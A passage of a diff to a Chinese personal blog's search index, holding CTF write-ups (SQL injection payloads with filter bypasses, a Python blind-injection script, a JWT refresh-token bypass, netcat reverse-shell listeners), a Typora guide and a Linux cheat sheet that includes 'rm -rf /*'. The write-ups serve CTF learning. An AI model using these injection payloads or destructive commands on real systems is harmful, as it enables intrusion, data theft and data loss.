+<p>使用云服务器监听1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>buu的SQL</title>
+    <url>/2022/12/03/SQL%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<p>[极客大挑战 2019]LoveSQL	[极客大挑战 2019]BabySQL	[极客大挑战 2019]HardSQL	[GXYCTF2019]BabySQli	[CISCN2019 华北赛区 Day2 Web1]Hack World</p>
+<span id="more"></span>
+
+<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>1.先使用万能密码1’ or 1&#x3D;1#进行尝试查看是否有回显，查看存在回显</p>
+<p>2.查看字段数，使用order by或者union select，因为是在http行进行的输入#注释无法使用，所以使用%23来进行注释</p>
+<p>3.经过试验有3个字段，然后进行联合注入即可</p>
+<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>1.经过试验存在union，select，or，注释符，and，from，where及其他过滤，但是可以使用%23进行注释，这里可以都是用双写绕过</p>
+<p>2.使用万能密码，存在回显</p>
+<p>3.使用联合注入check.php?username&#x3D;1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23&amp;password&#x3D;123来爆出所有的库</p>
+<p>4.选用ctf库，进行爆表名为flag，再爆字段也为flag</p>
+<p>5.最后爆数据</p>
+<h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>1.存在空格，union，and，&#x3D;，过滤</p>
+<p>2.使用报错型注入，注入时的语句不可以带有空格，使用check.php?username&#x3D;1&amp;password&#x3D;1’or(extractvalue(1,concat(0x7e,(select(database())))))%23来爆出数据库</p>
+<p>3.然后继续使用报错型注入来爆表，字段，</p>
+<p>4.获得数据时flag无法显示完全，使用left()和right()函数来获得全部数据，例如group_concat(right(password,32))</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()和right()函数用法</span><br><span class="line">LEFT (input_string , number_of_characters)</span><br><span class="line">input_string可以是文字字符串，变量或列。</span><br><span class="line">number_of_characters是一个正整数，指定将返回input_string的字符数。</span><br></pre></td></tr></table></figure>
+
+<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>1.存在()过滤，使用union盲注</p>
+<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>1.该关是盲注，并且存在过滤，打开网页上已经提示flag在flag表的flag列</p>
+<p>2.输入1发现返回Hello, glzjin wants a girlfriend.输入2返回Do you want to be my girlfriend?</p>
+<p>3.利用1和2返回的值进行构造if(substr((select(flag)from(flag)),1,1)&#x3D;’’,1,2)如果正确就会返回输入1时的内容，不正确就会返回输入2时的内容</p>
+<p>4.然后写盲注脚本(有点小问题)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;:</span><br><span class="line">        url=&quot;http://473b566b-93a5-4ae6-b850-b77390a9dc6a.node4.buuoj.cn:81&quot;</span><br><span class="line">        sqls=&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;.format(i,j)</span><br><span class="line">        data=&#123;&quot;id&quot;:sqls&#125;</span><br><span class="line">        c = s.post(url,data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>Typora用法</title>
+    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Typora基本用法</p>
+<span id="more"></span>
+
+<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>
+
+<p>红色的代码是#ff0000</p>
+<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>easynode(GKCTF 2021)</title>
     <url>/2023/06/23/%5BGKCTF%202021%5Deasynode/</url>
     <content><![CDATA[<p>node原型链污染</p>
@@ -321,6 +367,38 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230623214302527.png" alt="image-20230623214302527"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>My Vouchers Repo(BSidesTLV 2023 CTF)</title>
+    <url>/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/</url>
+    <content><![CDATA[<p>My Vouchers Repo</p>
+<span id="more"></span>
+
+<meta name="referrer" content="no-referrer">
+
+<p>打开页面就是一个登录和注册界面</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162249810.png" alt="image-20230628162249810"></p>
+<p>那就先注册一个，一个是home界面，还有一个是优惠卷界面</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162320815.png" alt="image-20230628162320815"></p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162356398.png" alt="image-20230628162356398"></p>
+<p>根据题目给你信息，应该是要登录用户名为<code>john</code>的用户，然后在源代码处的<code>[main.eb04397cc22cdfc5.js](https://my-voucher-repo.ctf.bsidestlv.com/main.eb04397cc22cdfc5.js)</code>中看到</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162544646.png" alt="image-20230628162544646"></p>
+<p>这样知道了是在header头<code>Authorization</code>处有用户登录信息，然后就是想办法伪造一个用户名是<code>john</code>的用户，这个是jwt，但是找不到密钥，还在源代码中找到一个api接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/signin</span><br><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
+
+<p>扫描目录发现还有一个<code>api/v1</code>接口，但是显示<code>not found</code>，接下来就不会做了，然后就看别人给的hint，发现api&#x2F;v1是可以打开的</p>
+<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628163909724.png" alt="image-20230628163909724"></p>
+<p>这个有一个<code>/refresh_token</code>，所以在url为一下界面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v1/refresh_token</span><br></pre></td></tr></table></figure>
+
+<p>使用json传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;john&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样可以回显一个用户名为john的token，然后在url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
+
+<p>header头中的<code>Authorization</code>中输入<code>Bearer 用户名为john的token</code>就可以得到flag</p>
 ]]></content>
   </entry>
   <entry>
@@ -561,83 +639,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>linux命令</title>
-    <url>/2022/10/03/linux/</url>
-    <content><![CDATA[<p>linux的基本命令</p>
-<span id="more"></span>
-
-<h6 id="1-cd命令（切换目录）"><a href="#1-cd命令（切换目录）" class="headerlink" title="1.cd命令（切换目录）"></a>1.cd命令（切换目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /                 //切换到根目录</span><br><span class="line">cd /bin              //切换到根目录下的bin目录</span><br><span class="line">cd ../               //切换到上一级目录 或者使用命令：cd ..</span><br><span class="line">cd ~                 //切换到home目录</span><br><span class="line">cd -                 //切换到上次访问的目录</span><br><span class="line">cd xx(文件夹名)       //切换到本目录下的名为xx的文件目录，如果目录不存在报错</span><br><span class="line">cd /xxx/xx/x         //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</span><br></pre></td></tr></table></figure>
-
-<h6 id="2-ls命令（查看目录）"><a href="#2-ls命令（查看目录）" class="headerlink" title="2.ls命令（查看目录）"></a>2.ls命令（查看目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                   //查看当前目录下的所有目录和文件</span><br><span class="line">ls /                 //查看指定目录下的文件</span><br><span class="line">ls -a                //查看当前目录下的所有目录和文件（包括隐藏的文件）</span><br><span class="line">ls -l                //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</span><br><span class="line">ls /bin              //查看指定目录下的所有目录和文件</span><br></pre></td></tr></table></figure>
-
-<h6 id="3-mkdir命令（创建文件夹）"><a href="#3-mkdir命令（创建文件夹）" class="headerlink" title="3.mkdir命令（创建文件夹）"></a>3.mkdir命令（创建文件夹）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools          //在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools     //在指定目录下创建一个名为tools的目录</span><br><span class="line">mkdir -m 711 test1   //配置文件的权限</span><br></pre></td></tr></table></figure>
-
-<h6 id="4-touch命令（创建文件）"><a href="#4-touch命令（创建文件）" class="headerlink" title="4.touch命令（创建文件）"></a>4.touch命令（创建文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch tools.txt      //在该目录下创建一个后缀为txt的文件</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-rm命令（删除目录与文件）"><a href="#5-rm命令（删除目录与文件）" class="headerlink" title="5.rm命令（删除目录与文件）"></a>5.rm命令（删除目录与文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的文件（不询问）</span><br><span class="line">rm -r 文件夹名         //递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名        //递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *              //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*             //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br></pre></td></tr></table></figure>
-
-<h6 id="6-mv命令（修改目录）"><a href="#6-mv命令（修改目录）" class="headerlink" title="6.mv命令（修改目录）"></a>6.mv命令（修改目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line">mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
-
-<h6 id="7-cp命令（拷贝目录）"><a href="#7-cp命令（拷贝目录）" class="headerlink" title="7.cp命令（拷贝目录）"></a>7.cp命令（拷贝目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪切复制目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
-
-<h6 id="8-cat命令"><a href="#8-cat命令" class="headerlink" title="8.cat命令"></a>8.cat命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 文件名                    //查看文件中的全部信息(适合查看小文档)</span><br></pre></td></tr></table></figure>
-
-<h6 id="9-rmp命令（插件安装命令）"><a href="#9-rmp命令（插件安装命令）" class="headerlink" title="9.rmp命令（插件安装命令）"></a>9.rmp命令（插件安装命令）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：插件安装命令</span><br><span class="line">rpm -i httpd-2.2.3-22.0.1.el5.i386.rpm         //使用rpm文件安装apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //使用rpm更新apache </span><br><span class="line">rpm -e httpd                                 //卸载/删除apache</span><br></pre></td></tr></table></figure>
-
-<h6 id="10-修改ip命令"><a href="#10-修改ip命令" class="headerlink" title="10.修改ip命令"></a>10.修改ip命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改网络配置文件，文件地址：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">------------------------------------------------</span><br><span class="line">主要修改以下配置：  </span><br><span class="line">TYPE=Ethernet               //网络类型</span><br><span class="line">BOOTPROTO=static            //静态IP</span><br><span class="line">DEVICE=ens00                //网卡名</span><br><span class="line">IPADDR=192.168.1.100        //设置的IP</span><br><span class="line">NETMASK=255.255.255.0       //子网掩码</span><br><span class="line">GATEWAY=192.168.1.1         //网关</span><br><span class="line">DNS1=192.168.1.1            //DNS</span><br><span class="line">DNS2=8.8.8.8                //备用DNS</span><br><span class="line">ONBOOT=yes                  //系统启动时启动此设置</span><br><span class="line">-------------------------------------------------</span><br><span class="line">修改保存以后使用命令重启网卡：service network restart</span><br></pre></td></tr></table></figure>
-
-<h6 id="11-apt命令（一般跟随sudo进行）"><a href="#11-apt命令（一般跟随sudo进行）" class="headerlink" title="11.apt命令（一般跟随sudo进行）"></a>11.apt命令（一般跟随sudo进行）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个新软件包，软件临时存放到/var/cache/apt/archives</span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个软件包</span><br><span class="line">apt-get remove packagename #卸载一个已安装的软件包（保留配置文档）</span><br><span class="line">apt-get update 升级列表中的软件包 </span><br><span class="line">apt-get upgrade 升级所有已安装的软件</span><br><span class="line">apt-get clean 从下载的软件包中清理缓存</span><br></pre></td></tr></table></figure>
-
-<h6 id="12-sudo命令"><a href="#12-sudo命令" class="headerlink" title="12.sudo命令"></a>12.sudo命令</h6><p><code>sudo</code>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的<code>root</code>命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非<code>root</code>的用户运行只有<code>root</code>才有权限执行的命令。</p>
-<h6 id="13-dpkg命令（使用时需要有deb软件包）"><a href="#13-dpkg命令（使用时需要有deb软件包）" class="headerlink" title="13.dpkg命令（使用时需要有deb软件包）"></a>13.dpkg命令（使用时需要有deb软件包）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i xx.deb  为对应的下载xx.deb软件的命令</span><br><span class="line">sudo dpkg -r xx.deb  为对应的卸载xx.deb软件的命令</span><br><span class="line">sudo dpkg -c xx.deb  显示软件包内文件列表</span><br><span class="line">sudo dpkg -l xx.deb  查询软件包的版本</span><br></pre></td></tr></table></figure>
-
-<p>使用这个命令需要有deb软件包</p>
-<p>步骤为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先cd xx.deb</span><br><span class="line">最后下载sudo dpkg -i xx.deb</span><br></pre></td></tr></table></figure>
-
-<h6 id="14-yum命令（ubuntu需配置yum安装源才可使用）"><a href="#14-yum命令（ubuntu需配置yum安装源才可使用）" class="headerlink" title="14.yum命令（ubuntu需配置yum安装源才可使用）"></a>14.yum命令（ubuntu需配置yum安装源才可使用）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install #全部安装</span><br><span class="line">yum update #全部更新</span><br></pre></td></tr></table></figure>
-
-<h6 id="15-在ubuntu上配置git"><a href="#15-在ubuntu上配置git" class="headerlink" title="15.在ubuntu上配置git"></a>15.在ubuntu上配置git</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用sudo apt-get install git进行安装</span><br><span class="line">git --version查看版本</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;你的邮箱地址&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;   该命令获取公钥，一般会存在于/root/.ssh文件中</span><br><span class="line">gedit ~/.ssh/id_rsa.pub     使用该命令查看公钥</span><br><span class="line">复制公钥进行github的上传</span><br><span class="line">git config --list   可查看配置信息</span><br></pre></td></tr></table></figure>
-
-<h6 id="16-ubuntu换源"><a href="#16-ubuntu换源" class="headerlink" title="16.ubuntu换源"></a>16.ubuntu换源</h6><p>先备份镜像源设置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
-
-<p>再编辑镜像源设置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
-
-<p>最后复制下面的所有内容替换掉原文件中的所有内容（阿里源）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
-
-<h6 id="17-root模式"><a href="#17-root模式" class="headerlink" title="17.root模式"></a>17.root模式</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入为su root</span><br><span class="line">退出为快捷键ctrl+d或者输入exit</span><br></pre></td></tr></table></figure>
-
-<h6 id="18-pwd命令（查看目录的绝对路径）"><a href="#18-pwd命令（查看目录的绝对路径）" class="headerlink" title="18.pwd命令（查看目录的绝对路径）"></a>18.pwd命令（查看目录的绝对路径）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd /</span><br></pre></td></tr></table></figure>
-
-<h6 id="19-关机命令"><a href="#19-关机命令" class="headerlink" title="19.关机命令"></a>19.关机命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统</span><br><span class="line">shutdown -r now 重启系统</span><br><span class="line">reboot    重启系统</span><br></pre></td></tr></table></figure>
-
-<h6 id="20-chmod命令（权限管理）"><a href="#20-chmod命令（权限管理）" class="headerlink" title="20.chmod命令（权限管理）"></a>20.chmod命令（权限管理）</h6><p>每个文件都有三个权限分别是r–读，w–写，x–执行，分别对应数字是4，2，1</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 764 name即赋予了name文件所有人的全部权限，文件所有组拥有读和写的权限，而其他人只拥有读的权限。</span><br></pre></td></tr></table></figure>
-
-<p>777的第一个7代表user即文件所有人，第二个6代表gourp即文件所有组，第三个4代表other即其他人</p>
-<h6 id="21-gdb"><a href="#21-gdb" class="headerlink" title="21.gdb"></a>21.gdb</h6><p>gdb是一种程序调试工具</p>
-<h6 id="22-find命令（可寻找文件）"><a href="#22-find命令（可寻找文件）" class="headerlink" title="22.find命令（可寻找文件）"></a>22.find命令（可寻找文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /home -name &quot;*.txt&quot;    为寻找/home里的.txt文件</span><br><span class="line">find -name &quot;*.txt&quot;    为寻找该目录下的.txt文件</span><br></pre></td></tr></table></figure>
-
-<h6 id="23-ps命令"><a href="#23-ps命令" class="headerlink" title="23.ps命令"></a>23.ps命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //查看所有正在运行的进程</span><br></pre></td></tr></table></figure>
-
-<h6 id="24-help命令"><a href="#24-help命令" class="headerlink" title="24.help命令"></a>24.help命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令 --help</span><br></pre></td></tr></table></figure>
-
-<h6 id="25-mount命令（挂载）"><a href="#25-mount命令（挂载）" class="headerlink" title="25.mount命令（挂载）"></a>25.mount命令（挂载）</h6><p>linux只能访问根目录里面的东西，如果想要访问根目录以外的东西就需要先”挂载“。</p>
-<h6 id="26-tail命令和head命令"><a href="#26-tail命令和head命令" class="headerlink" title="26.tail命令和head命令"></a>26.tail命令和head命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -5 /etc/passwd    #查看后5行内容</span><br><span class="line">head -5     #查看前5行内容</span><br></pre></td></tr></table></figure>
-
-<h6 id="27-chown命令（改变文件的属主）"><a href="#27-chown命令（改变文件的属主）" class="headerlink" title="27.chown命令（改变文件的属主）"></a>27.chown命令（改变文件的属主）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root /var/run/httpd.pid       /var/run/httpd.pid 的所有者设置 root</span><br><span class="line">chown runoob:runoobgroup file1.txt    将文件 file1.txt 的拥有者设为 runoob，群体的使用者 runoobgroup </span><br><span class="line">chown -R runoob:runoobgroup *       将当前前目录下的所有文件与子目录的拥有者皆设为 runoob，群体的使用者 runoobgroup</span><br></pre></td></tr></table></figure>
-
-<h6 id="28-kill命令（结束进程）"><a href="#28-kill命令（结束进程）" class="headerlink" title="28.kill命令（结束进程）"></a>28.kill命令（结束进程）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //杀死该pid的进程</span><br><span class="line">kill -9 pid    //强制杀死该进程</span><br></pre></td></tr></table></figure>
-
-<h6 id="29-grep命令"><a href="#29-grep命令" class="headerlink" title="29.grep命令"></a>29.grep命令</h6><p>用于查找文件里符合条件的字符串</p>
-<h6 id="30-tar命令"><a href="#30-tar命令" class="headerlink" title="30.tar命令"></a>30.tar命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test     将test文件夹打包为test.tar并不压缩</span><br><span class="line">tar -zcvf test.tar.gz test     将test文件打包后以gzip压缩，默认以tar.gz为结尾名称为test.tar.gz</span><br></pre></td></tr></table></figure>
-
-<h6 id="31-more命令和less命令（分屏显示指定文件的内容）"><a href="#31-more命令和less命令（分屏显示指定文件的内容）" class="headerlink" title="31.more命令和less命令（分屏显示指定文件的内容）"></a>31.more命令和less命令（分屏显示指定文件的内容）</h6><h6 id="32-which命令（显示命令的绝对路径）"><a href="#32-which命令（显示命令的绝对路径）" class="headerlink" title="32.which命令（显示命令的绝对路径）"></a>32.which命令（显示命令的绝对路径）</h6>]]></content>
-  </entry>
-  <entry>
     <title>mysql基础</title>
     <url>/2022/11/15/mysql%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>mysql基础</p>
@@ -821,6 +822,83 @@
 <h4 id="30-事务"><a href="#30-事务" class="headerlink" title="30.事务"></a>30.事务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin开始一个事务</span><br><span class="line">rollback事务回滚</span><br><span class="line">commit事务确认</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>linux命令</title>
+    <url>/2022/10/03/linux/</url>
+    <content><![CDATA[<p>linux的基本命令</p>
+<span id="more"></span>
+
+<h6 id="1-cd命令（切换目录）"><a href="#1-cd命令（切换目录）" class="headerlink" title="1.cd命令（切换目录）"></a>1.cd命令（切换目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /                 //切换到根目录</span><br><span class="line">cd /bin              //切换到根目录下的bin目录</span><br><span class="line">cd ../               //切换到上一级目录 或者使用命令：cd ..</span><br><span class="line">cd ~                 //切换到home目录</span><br><span class="line">cd -                 //切换到上次访问的目录</span><br><span class="line">cd xx(文件夹名)       //切换到本目录下的名为xx的文件目录，如果目录不存在报错</span><br><span class="line">cd /xxx/xx/x         //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-ls命令（查看目录）"><a href="#2-ls命令（查看目录）" class="headerlink" title="2.ls命令（查看目录）"></a>2.ls命令（查看目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                   //查看当前目录下的所有目录和文件</span><br><span class="line">ls /                 //查看指定目录下的文件</span><br><span class="line">ls -a                //查看当前目录下的所有目录和文件（包括隐藏的文件）</span><br><span class="line">ls -l                //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</span><br><span class="line">ls /bin              //查看指定目录下的所有目录和文件</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-mkdir命令（创建文件夹）"><a href="#3-mkdir命令（创建文件夹）" class="headerlink" title="3.mkdir命令（创建文件夹）"></a>3.mkdir命令（创建文件夹）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools          //在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools     //在指定目录下创建一个名为tools的目录</span><br><span class="line">mkdir -m 711 test1   //配置文件的权限</span><br></pre></td></tr></table></figure>
+
+<h6 id="4-touch命令（创建文件）"><a href="#4-touch命令（创建文件）" class="headerlink" title="4.touch命令（创建文件）"></a>4.touch命令（创建文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch tools.txt      //在该目录下创建一个后缀为txt的文件</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-rm命令（删除目录与文件）"><a href="#5-rm命令（删除目录与文件）" class="headerlink" title="5.rm命令（删除目录与文件）"></a>5.rm命令（删除目录与文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的文件（不询问）</span><br><span class="line">rm -r 文件夹名         //递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名        //递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *              //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*             //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br></pre></td></tr></table></figure>
+
+<h6 id="6-mv命令（修改目录）"><a href="#6-mv命令（修改目录）" class="headerlink" title="6.mv命令（修改目录）"></a>6.mv命令（修改目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line">mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
+
